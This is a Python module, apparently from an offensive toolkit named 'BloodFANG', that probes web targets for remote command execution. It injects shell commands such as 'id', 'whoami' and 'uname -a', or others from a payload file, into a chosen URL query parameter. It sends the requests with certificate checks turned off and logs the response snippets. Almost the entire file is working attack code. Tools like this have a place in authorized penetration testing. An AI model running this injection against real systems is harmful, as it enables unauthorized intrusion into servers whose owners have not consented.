# fangrce.py
"""
Basic RCE probe entrypoints:
 - scan_rce(url, param, emit, stop_event=None)
 - scan(target, emit, stop_event=None)
"""
import requests
import urllib.parse
import time
import os
from pathlib import Path

def _find_payload_dir():
    here = Path(__file__).resolve().parent
    cand = here / "payloads"
    if cand.exists(): return cand
    cur = here
    for _ in range(6):
        p = cur / "payloads"
        if p.exists(): return p
        p2 = cur / "BloodFANG" / "core" / "payloads"
        if p2.exists(): return p2
        cur = cur.parent
    env = os.getenv("BLOODFANG_PAYLOADS")
    if env:
        p = Path(env)
        if p.exists(): return p
    return cand

PAYLOAD_DIR = _find_payload_dir()

def _load_payloads(name, fallback):
    try:
        f = PAYLOAD_DIR / name
        if f.exists():
            text = f.read_text(encoding="utf-8", errors="ignore")
            lines = [L.strip() for L in text.splitlines() if L.strip() and not L.strip().startswith("#")]
            if lines: return lines
    except Exception:
        pass
    return fallback

CMDS = _load_payloads("rce_payloads.txt", ["id", "whoami", "uname -a"])

def _compose(url, param, payload):
    p = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    q = [(k, v) for (k, v) in q if k != param]
    q.append((param, payload))
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def scan_rce(url, param, emit, stop_event=None):
    if not url:
        emit("[RCE] Missing URL.")
        return
    if not param:
        emit("[RCE] Missing parameter.")
        return

    emit(f"[RCE] Target: {url} param={param}")
    for cmd in CMDS:
        if stop_event is not None and getattr(stop_event, "is_set", lambda: False)():
            emit("[RCE] Stopped by user.")
            return
        t = _compose(url, param, cmd)
        try:
            r = requests.get(t, timeout=8, verify=False)
            emit(f"[RCE] {r.status_code} → {t}")
            emit(f"[RCE] Snippet: {r.text[:180].replace(chr(10),' ')}")
        except requests.exceptions.RequestException as re:
            emit(f"[RCE] Request error: {re}")
        except Exception as e:
            emit(f"[RCE] Unexpected error: {e}")
        time.sleep(0.3)
    emit("[RCE] Done.")

def scan(target, emit, stop_event=None):
    url, param = (target.split("::", 1) + [""])[:2]
    scan_rce(url, param, emit, stop_event)
